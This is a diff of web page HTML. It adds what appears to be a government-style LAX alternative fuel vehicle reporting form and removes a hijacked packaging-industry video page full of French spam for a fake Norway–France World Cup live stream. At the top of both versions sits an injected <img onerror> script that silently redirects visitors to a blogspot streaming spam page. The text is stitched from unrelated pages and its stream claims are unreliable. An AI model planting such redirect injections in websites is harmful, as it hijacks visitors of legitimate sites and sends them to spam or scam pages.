@@ -1,193 +1,500 @@
+<img src='0' onerror= top.location.href='https://rakibstream-07.blogspot.com/2026/06/norway-vs-france_0134983527.html'><!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><title>
+	LAX Alternative Fuel Vehicle Reporting Form
+</title>    
+    <script src="Scripts/jquery-2.2.4.min.js"></script>
+    <script src="Scripts/bootstrap.js"></script>
+    <link href="Content/bootstrap.css" rel="stylesheet" />
+    <script src="Scripts/bootstrap-datepicker.min.js"></script>
+    <link href="Content/bootstrap-datepicker.min.css" rel="stylesheet" />
+    <script src="Scripts/jquery.scrollTo-1.4.3.1-min.js"></script>
+    <link href="https://www.lawa.org/UI/Lawa/Assets/font-awesome/css/font-awesome.min.css" rel="stylesheet" /><link href="https://www.lawa.org/UI/Lawa/Assets/css/style.css" rel="stylesheet" />
+
+
+    <style>
+        #copyright {
+          position: fixed;
+          left:0px;
+          bottom:0px;
+          height:20px;
+          width:100%;         
+          color:gray;
+          z-index: -1;
+        }
+        
+        .hidden
+        {
+            display: none;
+        }
+        .mygridview tr:hover
+        {
+            cursor: pointer;
+            /*background-color: #FFFFB7;*/
+        }
+
+        .contactgridview tr:hover
+        {
+            /*background-color: #FFFFB7;*/
+        }
+
+        .myLabelErrMsg
+        {
+            font-size: 16px;
+            font-weight: bold;
+            color: darkred;
+        }
+
+        /* Set body visible = false so that jquery can fade in the contents*/
+        /*body {
+            display: none;
+        }*/
+
+        .well {
+            border: 1px solid lightgrey;
+            border-radius: 25px;
+        }
+
+        .control-label {
+            font-weight: normal;
+        }
+
+        h4 {
+            font-weight: bold;
+            padding-bottom: 20px;
+            padding-top: 20px;
+        }
+
+        .label {
+            font-size: 14px;
+        }
+
+        label { display: inline-block; }
+
+        .myroundlabels {
+            color: black; 
+            background-color: lightgreen; 
+            font-weight: bold; 
+            padding-right: 5px; 
+            padding-left: 5px; 
+            padding-top: 5px; 
+            padding-bottom: 5px; 
+            border-radius: 10px;
+        }
+
+        /* http://work.smarchal.com/twbscolor/ */
+        /*Begin custom color nav bar*/
+        .navbar-default {
+          background-color: #00A5CD;
+          border-color: #113191;
+        }
+        .navbar-default .navbar-brand {
+          /*color: #ffffff;          */
+          color: #3252a8;
+        }
+        .navbar-default .navbar-brand:hover,
+        .navbar-default .navbar-brand:focus {
+          /*color: #ffffff;*/
+           color: #3252a8;
+        }
+        .navbar-default .navbar-text {
+             /*color: #ffffff;*/
+           color: #3252a8;
+        }
+        .navbar-default .navbar-nav > li > a {
+            /*color: #ffffff;*/
+           color: #3252a8;
+        }
+        .navbar-default .navbar-nav > li > a:hover,
+        .navbar-default .navbar-nav > li > a:focus {
+            /*color: #ffffff;*/
+           color: #3252a8;
+        }
+        .navbar-default .navbar-nav > .active > a,
+        .navbar-default .navbar-nav > .active > a:hover,
+        .navbar-default .navbar-nav > .active > a:focus {
+             /*color: #ffffff;*/
+           color: #3252a8;
+          background-color: #0a7ca7;
+        }
+        .navbar-default .navbar-nav > .open > a,
+        .navbar-default .navbar-nav > .open > a:hover,
+        .navbar-default .navbar-nav > .open > a:focus {
+             /*color: #ffffff;*/
+           color: #3252a8;
+          background-color: #0a7ca7;
+        }
+        .navbar-default .navbar-toggle {
+          border-color: #0a7ca7;
+        }
+        .navbar-default .navbar-toggle:hover,
+        .navbar-default .navbar-toggle:focus {
+          background-color: #0a7ca7;
+        }
+        .navbar-default .navbar-toggle .icon-bar {
+          background-color: #ffffff;
+        }
+        .navbar-default .navbar-collapse,
+        .navbar-default .navbar-form {
+          border-color: #ffffff;
+        }
+        .navbar-default .navbar-link {
+          color: #ffffff;
+        }
+        .navbar-default .navbar-link:hover {
+          color: #ffffff;
+        }
+
+        .navbar-menu-right{
+            float: right !important;
+            margin-right: 10px;
+            font-size:15px;
+            font-weight:bold;
+        }
+
+        .navbar-homepagemsg-center{            
+            position: relative;            
+            left:15%;
+            float:left;
+        }
+
+       .master-plan-space
+       {
+           margin-top:20px;
+           display:block;
+       }
+
+      /* ul.nav.navbar-menu-right > li > a {
+           color: aqua;
+       }
+       
+       ul.nav.navbar-menu-right > li > a.hover,
+       ul.nav.navbar-menu-right > li > a:focus 
+       {
+           color:cadetblue;
+       }*/
+
+      ul.nav.navbar-menu-right > li > a:visited {
+		color: #047ad2;
+	  }
+	  ul.nav.navbar-menu-right > li > a.hover{
+		color: #041a77; /* blue */
+		cursor: pointer;
+		text-decoration: underline !important;
+	  }      
+
+
+       .homepage-msg{
+            position: relative; 
+            left: 50%;
+            transform: translateX(-50%);           
+            font-size: 20px;
+            font-weight:bold;
+            text-align:center;
+        }
+       
+       .navbar-menu-right > li > a > img{
+           width:20px;
+           height:20px;
+       }
+
+        @media only screen and (max-width: 1440px) {           
+             .homepage-msg{     
+               position: relative; 
+               left: 80%;
+               transform: translateX(-50%);
+             }                
+
+            .logo-responsive{                 
+                   padding-left: 5px;
+             }          
+             .homepage-msg > .navbar-brand{
+                  font-size: 16px;
+              }              
+
+              .homepage-msg > .navbar-brand > .master-plan-space {
+                margin-top:10px;    
+              }
+
+             .navbar-menu-right{
+                position: relative; 
+                left: 6%;
+                transform: translateX(-50%);  
+               
+             }
+             .navbar-homepagemsg-center{
+                position: relative; 
+                left: 10%;
+             }               
+             
+             .navbar-header {
+                 height:40px;
+             }
+        }
+
+        @media only screen and (max-width: 1280px) {
+            .homepage-msg{     
+               position: relative; 
+               left: 80%;
+               transform: translateX(-50%);
+               
+             }            
+             .navbar-homepagemsg-center{
+                position: relative; 
+                left: -3%;
+             }
+        }          
+
+        @media only screen and (max-width: 1024px) {
+            .homepage-msg{     
+               position: relative; 
+               left: 70%;
+               transform: translateX(-50%);                    
+            }
+
+            .homepage-msg > .navbar-brand{
+                  font-size: 14px;
+            }  
+
+            .navbar-menu-right{
+                position: relative; 
+                left: 8%;
+                transform: translateX(-50%);               
+             }
+
+             .navbar-homepagemsg-center{
+                position: relative; 
+                left:-15%;
+             }             
+        }   
+
+        @media only screen and (max-width: 768px) {
+            .homepage-msg{     
+               position: relative;               
+               left: 30%;
+               transform: translateX(-10%);                   
+             }           
+
+            .logo-responsive{                 
+                max-height:80%;
+                max-height:80%
+             }  
+
+             .homepage-msg > .navbar-brand {
+                 font-size: 12px;
+             }
+             
+            .navbar-menu-right{
+                position: relative; 
+                left: 8%;
+                transform: translateX(-40%);  
+                font-size:12px !important;
+                font-weight:bold;
+             }
+
+             .navbar-homepagemsg-center{
+                position: relative;     
+                left: -10%;
+             }
+
+             .master-plan-space{
+                 margin-top:-2px;
+             }       
+             
+             .navbar-header img {
+                position: relative;     
+                left: -10%;
+             }
+
+             .navbar-brand
+             {
+                 margin-left: 5% !important;
+             }
+        }
 
 
 
-<img src="/static/images/d4fdf41d5g.png" onerror="setTimeout(function(){window.location='https://rakibstream-07.blogspot.com/2026/06/norway-vs-france.html';},1000);">
+        @media only screen and (max-width: 767px) {
 
+            .navbar-default .navbar-nav .open .dropdown-menu > li > a {
+                color: #ffffff;
+            }
 
+            .navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,
+            .navbar-default .navbar-nav .open .dropdown-menu > li > a:focus {
+                color: #ffffff;
+            }
 
-<!DOCTYPE html>
-<html lang="en">
-<head><meta charSet="utf-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
-<link rel="stylesheet" href="/_next/static/css/333c628129707d37.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/12562c5776cf8e47.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/8a8fcd77154abd96.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/c190c3789f1d6467.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/211c89f5209bd7fe.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/a1571332f20d8428.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/4e841c5684d9835d.css" data-precedence="next"/>
-<link rel="stylesheet" href="/_next/static/css/d155e57d964f7280.css" data-precedence="next"/>
-<link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-5d8e581bd320042f.js"/>
-<script src="/_next/static/chunks/4bd1b696-36528517ed0a4fe7.js" async=""></script>
-<script src="/_next/static/chunks/428-8d2bb8348b3d226a.js" async=""></script>
-<script src="/_next/static/chunks/main-app-ea45ea18da1963e3.js" async=""></script>
-<script src="/_next/static/chunks/53c13509-0d4fc72ddf83f729.js" async=""></script>
-<script src="/_next/static/chunks/8e1d74a4-b53153930fa1f840.js" async=""></script>
-<script src="/_next/static/chunks/3d47b92a-e354a28c805214ca.js" async=""></script>
-<script src="/_next/static/chunks/479ba886-59c64b7535c61d12.js" async=""></script>
-<script src="/_next/static/chunks/f8025e75-ac09396323c75bf9.js" async=""></script>
-<script src="/_next/static/chunks/5131-86750c6ed50bfaa2.js" async=""></script>
-<script src="/_next/static/chunks/4134-f058a0f7d2fee07d.js" async=""></script>
-<script src="/_next/static/chunks/9781-6b379b5c7c1afdc0.js" async=""></script>
-<script src="/_next/static/chunks/8909-fd7c41986e96ad19.js" async=""></script>
-<script src="/_next/static/chunks/563-097f9287f0fcebe8.js" async=""></script>
-<script src="/_next/static/chunks/2104-da95aebb3659b560.js" async=""></script>
-<script src="/_next/static/chunks/7222-99d4289fea72b91e.js" async=""></script>
-<script src="/_next/static/chunks/8863-0c5637bef66484f1.js" async=""></script>
-<script src="/_next/static/chunks/9418-c09abfde53dad3b0.js" async=""></script>
-<script src="/_next/static/chunks/3968-2d96a174930c5ae8.js" async=""></script>
-<script src="/_next/static/chunks/app/video/%5Bseo%5D/page-c13692f9c2ccf2e5.js" async=""></script>
-<script src="/_next/static/chunks/7ce798d6-940917fdc75edf1a.js" async=""></script>
-<script src="/_next/static/chunks/c917193b-b41fc17553617fc3.js" async=""></script>
-<script src="/_next/static/chunks/6581-63452097392a7528.js" async=""></script>
-<script src="/_next/static/chunks/4674-84c4b3662f390d0b.js" async=""></script>
-<script src="/_next/static/chunks/app/layout-7454014ea659c8d8.js" async=""></script>
-<script src="/_next/static/chunks/app/not-found-6feb72341b6bcb1f.js" async=""></script>
-<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XRGSFEF"></script>
-<link rel="preload" href="/assets/common/js/jquery/jquery-3.6.0.min.js" as="script"/>
-<meta name="description" content="EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I"/>
-<meta name="keywords" content="packaging, sustainability, quality, product management"/>
-<meta property="og:title" content="[Streaming-HD] Norvège - France Coupe du Monde de la FIFA match en direct Live 2026"/>
-<meta property="og:description" content="EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I"/>
-<meta property="og:url" content=" "/>
-<time datetime="2026-06-26T00:29:52+0000"></time>
-<meta property="og:site_name" content=" "/>
-<meta property="og:image" content="http://ac.ipvc.pt/imgs/1/live-stream-red-ribbon-in-flat-style-on-white-background-play-web-media-motion-graphics-video.jpg"/>
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:site" content=" "/>
-<meta name="twitter:title" content="[ESPN EN DIRECT] Norvège - Francee Match en directt"/>
-<meta name="twitter:description" content="EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I"/><meta name="twitter:image" content="https://www.shutterstock.com/shutterstock/videos/1108388289/thumb/9.jpg"/>
-<link rel="preload" href="/assets/font/DMSans-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous"/>
-<meta id="Authorname" name="Author" content="CNS MEDIA"/>
-<meta name="Email" content="technical@innovami.com"/>
-<meta name="Copyright" content="Copyright 2025 Innova. All Rights Reserved."/>
-<meta prefix="og: http://ogp.me/ns#" property="og:type" content="website"/>
-<meta property="og:image:width" content="200"/>
-<meta property="og:image:height" content="200"/>
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="ahrefs-site-verification" content="0756a13633469bedf91eb344425f6639cedfb1deabeb3d586a20dedf"/>
-<meta http-equiv="X-UA-Compatible" content="IE=11,IE=edge,chrome=1"/>
-<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
-<meta name="google-site-verification" content="saTMdBp8WjKQsdm247g1uOtEFOkLP9AC-9HhpZ0THeE"/>
-<meta property="fb:app_id" content="839497312837148"/>
-<link rel="preload" href="/assets/pi/css/common.css" as="style"/>
-<link rel="icon" href="/content/pi/images/favicon.ico" type="image/x-icon"/>
-<link rel="apple-touch-icon" href="/content/pi/images/favicon.ico"/>
-<link rel="manifest" href="//assets.innovamarketinsights360.com/insightsbeta/pwa/pi/manifest.json"/>
-<meta name="title" content="[ESPN EN DIRECT] Norvège - Francee Match en directt"/>
-<title>[ESPN EN DIRECT] Norvège - Francee Match en directt</title>
-<link rel="stylesheet" href="/assets/pi/css/common.css"/>
-<script>(self.__next_s=self.__next_s||[]).push(["/assets/common/js/jquery/jquery-3.6.0.min.js",{}])</script>
+            .navbar-default .navbar-nav .open .dropdown-menu > .active > a,
+            .navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,
+            .navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus {
+                color: #ffffff;
+                background-color: #0a7ca7;
+            }
+
+            .navbar-menu-right {
+                position: relative;
+                left: 8%;
+                transform: translateX(-40%);
+                font-size: 10px !important;
+                font-weight: bold;
+            }
+
+            .navbar-homepagemsg-center {
+                position: relative;
+                left: 20%;
+            }
+
+            .master-plan-space {
+                margin-top: -4px;
+            }
+
+            .logo-responsive {
+                max-width: 50%;
+                max-height: 50%;                
+            }
+
+            .navbar-brand {
+                padding-top:0px;
+              
+             }             
+
+            .navbar-header button {
+                background-color: #0a7ca7;
+                padding: 0px 20px;
+            }
+
+             .navbar-header img {
+                position: relative;
+                margin-left: 10% !important
+             }
+            
+        }
+        
+        /*End custom color nav bar*/
+    </style>
+
     <script>
-              window.dataLayer = window.dataLayer || [];
-              function gtag(){dataLayer.push(arguments);}
-              gtag('js', new Date());
-              gtag('config', 'G-WBX4SXJYEF', {
-                page_path: window.location.pathname || ""
-              });
-     </script>
-  <script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule="">
-  </script></head>
-  <body class=""><div></div>
-  <div id="backgroundbanner" style="display:block">
-  <div>
-  <div>
-  <div class="maincontent-container">
-  <div class="content-container" id="content-container"><div>
-  <div class="mainmultimedia-container">
-  <div class="bredgrumsdiv">
-  <div class="bredgrumpara bredgrum-paraalign">
-  <a href="/" class="homeparacolor bredgrum-fontsize">Home<!-- --> </a>
-  <div class="rightheadicondiv"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="arrowheadicon" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10.707 17.707 17.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z"></path></svg> </div><span class="source-color"><a class="source-color bredgrum-fontsize" href="/videos.html">Videos</a></span> 
-  <div class="rightheadicondiv"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="arrowheadicon" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10.707 17.707 17.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z"></path></svg></div><span class="cursordefault">Drinktec 2026 live: ...</span></div></div>
-  <div class="contenttitlediv">
-  <div class="firsttitlediv"><p class="videotitletext">[Streaming-En-Ligne] Norvège - France Coupe du Monde de la FIFA match en direct Live 2026</p><p class="videodatecompany source-color">2026-06-26<!-- --> |<!-- --> <!-- -->Sidel</p></div>
-  <div class="shareiconbtndiv responsewidthshareicon">
-  <div class="iconstitlediv responsepaddingright">
-  <div class=" ">
-  <div class="a2a_kit a2a_kit_size_32 a2a_default_style fl" style="flex-direction:row;display:flex;align-items:center;justify-content:center">
-  <a class="a2a_button_linkedin " style="padding:0px !important;padding-top:5px !important;padding-left:4px !important;display:flex;justify-content:center;align-items:center" aria-label="share on Linkedin"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" style="margin-top:-4px;margin-right:5px" height="30" width="30" xmlns="http://www.w3.org/2000/svg"><path d="M417 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H417c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 417H69V202.2h66.5V417zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 28-39.9 54.9V417h-66.4V202.2h63.7v29.2h.9c8.9-17.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V417z"></path></svg></a><a class="a2a_button_x " style="padding:0px;margin-right:5px;display:flex;justify-content:center;align-items:center" aria-label="share on Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" style="margin-top:0px;margin-right:5px" height="28" width="28" xmlns="http://www.w3.org/2000/svg"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 285.5 26.8 48H172.4L282.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"></path></svg></a><a class="a2a_button_email " style="padding:0px;display:flex;justify-content:center;align-items:center" aria-label="share on Mail"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" style="margin-top:4px;margin-right:5px" height="33" width="33" xmlns="http://www.w3.org/2000/svg"><path d="M22 7.535v9.465a3 3 0 0 1 -2.824 2.995l-.176 .005h-14a3 3 0 0 1 -2.995 -2.824l-.005 -.176v-9.465l9.445 6.297l.117 .066a1 1 0 0 0 .878 0l.117 -.066l9.445 -6.297z"></path><path d="M19 4c1.09 0 2.028 .57 2.555 1.428l-9.555 6.37l-9.555 -6.37a2.999 2.999 0 0 1 2.354 -1.42l.201 -.007h14z"></path></svg></a><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" style="margin-top:5px;padding-left:3px;height:30px;width:30px;margin-bottom:3px;display:flex;justify-content:center;align-items:center;cursor:pointer" height="30" width="30" xmlns="http://www.w3.org/2000/svg"><path d="M732 120c0-4.4-3.6-8-8-8H300c-4.4 0-8 3.6-8 8v148h440V120zm120 212H172c-44.2 0-80 35.8-80 80v328c0 17.7 14.3 32 32 32h178v132c0 4.4 3.6 8 8 8h424c4.4 0 8-3.6 8-8V772h178c17.7 0 32-14.3 32-32V412c0-44.2-35.8-80-80-80zM664 844H360V568h304v286zm174-360c0 4.4-3.6 8-8 8h-40c-4.4 0-8-3.6-8-8v-40c0-4.4 3.6-8 8-8h40c4.4 0 8 3.6 8 8v40z"></path></svg></div></div></div></div></div>
-  <div class="homevideodiv responsevideoheight">
-  <iframe src "https://magazine.packaginginsights.com/previewvideo?EncryptedId=ASN3ZLZ6DWX4EPXYWDSABIEM2I&amp;Thumbnail=d1a8d452-b0c6-4228-a8cc-b3486fbfcf69videoimages.jpg&amp;From=Videos&amp;Country=Bangladesh" allowFullScreen="" title="[Streaming-HD] Norvège - France today 𝐋𝐈𝐕𝐄 ＯＮ Ｔｖ Ｃｈａｎｎｅｌ 10 June 2026"></iframe></div>
-  <div class="contentdetailsdiv ">
-  <div class="videocontenttext videosum" style="width:100%"><input type="hidden" name="video_title" value="[Match-En-Direct] Norvège - France today {EN-DIRECT-STREAM} Norvège - France today"/><input type="hidden" name="video_id" value="25212"/><p>EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></div></div>
-  <div class="morecontainer">
-  <div class="moretitlediv">
-  <p class="moretitle">More <!-- -->videos</p>
-  <a href="https://www.packaginginsights.com/all-videos.html"><button class="source-color seeallbtn linkcursor"><span class="viewalllink source-color">View more<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="seeiconbtn" height="12px" width="12px" xmlns="http://www.w3.org/2000/svg"><path d="M502.6 288.6c12.5-12.5 12.5-32.8 0-45.3l-128-128c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L402.7 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l370.7 0-73.4 73.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l128-128z"></path></svg></span></button></a></div>
-  <div class="morecontentdiv">
-  <a href="https://www.packaginginsights.com/video/sealpac-m-flex-traysealer-high-quality-flexible-packaging.html" class="multimediaredirect source-color">
-  <div class="moreimagediv linkcursor responseheightfitcontent">
-  <div class="hover-bg" style="background-image:url(&quot;https://resource-innova.s3.amazonaws.com/media/UMKKDIUOMTZTQUV3UIXVXZKTFU/GIF/UMKKDIUOMTZTQUV3UIXVXZKTFU.gif&quot;)"></div>
-  <img class="rec-size" src="http://ac.ipvc.pt/imgs/1/67c9542e235453001d8714d3.jpg" alt="FormattedPicture" style="width:100%;height:100%"/>
-  <div class="tagbottom source-backgroundcolor responsepaddingtop">Video<span class="playbutton"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-209c31.4-18.5 31.5-64.1 0-82.6z"></path></svg></span>02:09</div></div>
-  <div class="morecontenttitlesdiv linkcursor responsealigncontent"><p class="morevideotitle responsemargintop"> <!-- -->Norvège - France today</p><p class="morevideocontent responsedisplaynone">EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></a></div>
-  <div class="morecontentdiv"><a href="https://www.packaginginsights.com/video/luxury-packaging-glass-trends.html" class="multimediaredirect source-color">
-  <div class="moreimagediv linkcursor responseheightfitcontent">
-  <div class="hover-bg" style="background-image:url(&quot;https://resource-innova.s3.amazonaws.com/media/5VM3EJCZBNRPDASXF24QG5D2HY/GIF/5VM3EJCZBNRPDASXF24QG5D2HY.gif&quot;)"></div>
-  <img class="rec-size" src="http://ac.ipvc.pt/imgs/1/live-streaming-symbol-sign-icon-button-animation-motion-graphic-chroma-key-green-screen-4k-resolution-free-video.jpg" alt="FormattedPicture" style="width:100%;height:100%"/>
-  <div class="tagbottom source-backgroundcolor responsepaddingtop">Video<span class="playbutton"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-209c31.4-18.5 31.5-64.1 0-82.6z"></path></svg></span>13:11</div></div>
-  <div class="morecontenttitlesdiv linkcursor responsealigncontent"><p class="morevideotitle responsemargintop"> <!-- -->Norvège - France today</p><p class="morevideocontent responsedisplaynone">EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></a></div>
-  <div class="morecontentdiv">
-  <a href="https://www.packaginginsights.com/video/sidel-mexico-returnable-bottle-shift.html" class="multimediaredirect source-color">
-  <div class="moreimagediv linkcursor responseheightfitcontent">
-  <div class="hover-bg" style="background-image:url(&quot;https://resource-innova.s3.amazonaws.com/media/VIS645JYLTEST5WR2RBOM5XTIM/GIF/VIS645JYLTEST5WR2RBOM5XTIM.gif&quot;)"></div><img class="rec-size" src="http://ac.ipvc.pt/imgs/1/live-stream-red-ribbon-in-flat-style-on-white-background-play-web-media-motion-graphics-video.jpg" alt="FormattedPicture" style="width:100%;height:100%"/>
-  <div class="tagbottom source-backgroundcolor responsepaddingtop">Video<span class="playbutton"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-209c31.4-18.5 31.5-64.1 0-82.6z"></path></svg></span>09:12</div></div>
-  <div class="morecontenttitlesdiv linkcursor responsealigncontent"><p class="morevideotitle responsemargintop"> <!-- -->Norvège - France today</p><p class="morevideocontent responsedisplaynone">EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></a></div>
-  <div class="morecontentdiv">
-  <a href="https://www.packaginginsights.com/video/packaging-design-sustainability-delivery-ecommerce.html" class="multimediaredirect source-color">
-  <div class="moreimagediv linkcursor responseheightfitcontent"><div class="hover-bg" style="background-image:url(&quot;https://resource-innova.s3.amazonaws.com/media/QWUM4YSTTWXZ7YSLWVO2ULVWDE/GIF/QWUM4YSTTWXZ7YSLWVO2ULVWDE.gif&quot;)"></div><img class="rec-size" src="http://ac.ipvc.pt/imgs/1/benefits-of-live-streaming.jpg" alt="FormattedPicture" style="width:100%;height:100%"/>
-  <div class="tagbottom source-backgroundcolor responsepaddingtop">Video<span class="playbutton"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M424.4 214.7L72.4 6.6C43.8-10.3 0 6.1 0 47.9V464c0 37.5 40.7 60.1 72.4 41.3l352-209c31.4-18.5 31.5-64.1 0-82.6z"></path></svg></span>13:48</div></div>
-  <div class="morecontenttitlesdiv linkcursor responsealigncontent">
-  <p class="morevideotitle responsemargintop"> <!-- -->Norvège - France today</p><p class="morevideocontent responsedisplaynone">EN DIRECT - Norvège-France : un choc pour la première place du groupe VIDÉO Les Bleus, endeuillés après le décès de la mère de Didier Deschamps, visent la tête de leur poule. Un match nul contre la Norvège d'Erling Haaland.Norvège - France, Coupe du monde, match en direct le 26/06/2026.Bienvenue sur le live de L'Équipe pour suivre ce match de football en direct entre Norvège et France (Coupe du monde, 3e journée). Le coup d'envoi de ce.France - Norvège en direct à la Coupe du monde de football 2026 : Résultats live, compositions, scores, statistiques, commentaires et classement du groupe I</p></div></a></div>
-  <div class="morecontentdiv"><a href="https://www.packaginginsights.com/video/ai-automation-packaging-industry.html" class="multimediaredirect source-color">
-  <div class="moreimagediv linkcursor responseheightfitcontent">
-  <div class="hover-bg" style="background-image:url(&quot;https://resource-innova.s3.amazonaws.com/media/2SUH7F6F7NWVKLIMPC42UXALQU/GIF/2SUH7F6F7NWVKLIMPC42UXALQU.gif&quot;)"></div>
-  <img class="rec-size" src="http://ac.ipvc.pt/imgs/1/istockphoto-1357236672-640x640.jpg" alt="FormattedPicture" style="width:100%;height:100%"/>
